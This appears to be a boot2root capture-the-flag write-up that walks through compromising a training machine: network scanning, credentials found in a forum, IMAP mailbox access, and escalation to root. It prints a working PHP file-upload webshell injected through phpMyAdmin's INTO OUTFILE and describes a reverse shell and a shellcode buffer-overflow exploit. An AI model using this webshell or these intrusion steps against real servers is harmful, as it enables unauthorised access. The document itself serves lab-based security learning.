# boot2root writeup

After running the machine and configuring the networking to bridged with en0 interface, we ran a ping sweep to find the ip address.
```
$ bash misc/psweep.sh
64 bytes from 10.12.176.109: icmp_seq=0 ttl=64 time=2.276 ms
64 bytes from 10.12.176.125: icmp_seq=0 ttl=64 time=0.555 ms
64 bytes from 10.12.176.141: icmp_seq=0 ttl=64 time=0.955 ms
```

Running an nmap scan on the machine results in multiple open ports
```
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
```

Inspecting https we find two interesting routes /phpmyadmin and /forum, while browsing in the forum we find an interesting blog about troubleshooting sshd, and the blog author shared the error logs.
We find a valid password for user lmezard in the forum.

These credentials are only working on the imapd dovecot server, after logging in the the mailbox of laurie@borntosec.net we find root credentials to phpmyadmin,
giving us access to /phpmyadmin.

`openssl s_client -connect ip:993
a LOGIN user password
a LIST "" "*"
a SELECT INBOX.Sent
a FETCH 2 BODY.PEEK[]
`

With the help of phpmyadmin we can upload a php webshell that gives us arbitrary command execution.

`SELECT 
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
INTO OUTFILE '/var/www/forum/templates_c/upload.php';`

then we can upload a reverse shell you can find it in scripts

We run a listener, and execute a reverse shell payload through our webshell this is how we get a shell with user www-data.

We find a LOOKATME containing the credentials of user lmezard, we switch user with command su to lmezard, in it's home directory we find `fun` challenge.

We get our first challenge named `fun` solving it will give us ssh password of user laurie.

After solving the fun challenge we log in through ssh with laurie, and find another challenge a binary named bomb containing six phases that require a password to not explode, this challenge will give us access to user thor.

Thor contains a turtle graphics challenge, giving us a large file containing turtle commands for drawing the password, the password of user zaz

Finally zaz contains a set-uid binary with the owner root, the binary is vulnerable to a stack buffer overflow, we will inject shellcode that execute a shell and we get a root shell.
